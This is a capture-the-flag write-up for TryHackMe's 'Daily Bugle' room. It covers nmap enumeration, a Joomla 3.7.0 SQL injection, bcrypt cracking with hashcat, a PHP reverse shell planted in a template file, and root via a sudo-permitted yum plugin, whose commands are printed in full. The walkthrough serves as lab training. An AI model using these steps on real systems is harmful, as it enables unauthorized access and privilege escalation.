---
title: "TryHackMe - Daily Bugle"
author: Nasrallah
description: ""
date: 2023-06-11 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, linux, hard, sqli, sudo, joomla]
img_path: /assets/img/tryhackme/dailybugle
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Daily Bugle](https://tryhackme.com/room/dailybugle) from [TryHackMe](https://tryhackme.com).

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.152.170
Host is up (0.11s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)
|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)
|_  256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
3306/tcp open  mysql   MariaDB (unauthorized)

```

We found ssh on port 22, an Apache web server on port 80 with a robots.txt file that reveals multiple directories and the CMS used is Joomla.

## Web

Let's navigate to the web page.

![](1.png)

Since we know this is Joomla, let's run [joomscan](https://github.com/OWASP/joomscan).

![](2.png)

The version we found is `3.7.0`, let's see if it has any vulnerabilities.

```bash
$ searchsploit joomla 3.7                           
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                              |  Path
---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7 - SQL Injection                                                                                                 | php/remote/44227.php
Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                                  | php/webapps/42033.txt
```

It's vulnerable to sql injection.

I used this [exploit](https://github.com/teranpeterson/Joomblah) that worked very well.

![](3.png)

We got a username and a hash.

Let's use `hashcat` to crack the hash.

```bash
$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt                                                                                          1 ⨯
hashcat (v6.1.1) starting.

$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:<REDACTED>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
Hash.Target......: $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p...BtZutm
Time.Started.....: Tue Jun 20 12:02:35 2023 (21 mins, 37 secs)
Time.Estimated...: Tue Jun 20 12:24:12 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       36 H/s (3.13ms) @ Accel:8 Loops:4 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 46848/14344385 (0.33%)
Rejected.........: 0/46848 (0.00%)
Restore.Point....: 46816/14344385 (0.33%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1020-1024
Candidates.#1....: talisay -> smokers

```

Great! We got the password, now let' login.

![](4.png)

# **Foothold**

To get a shell, we go to Templates and select `protostar`.

![](5.png)

Now we choose a php file `error.php` for example and replace to php code with a [reverse shell](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php).

![](6.png)

Now we setup a listener and request the file at `http://targetIP/templates/protostar/error.php`

![](7.png)

We got a shell!


# **Privilege Escalation**

Let's run `linpeas`

![](8.png)

We found a password.

Let's switch to the only user on the machine.

![](9.png)

Great! Now let's check our privileges.

```bash
[jjameson@dailybugle home]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum

```

We can run `yum` as root.

Searching for ways to exploit that on GTFOBins we find a way to spawn interactive root shell by loading a custom plugin using the following commands:

```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

![](10.png)

We got root!

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).

---

# References
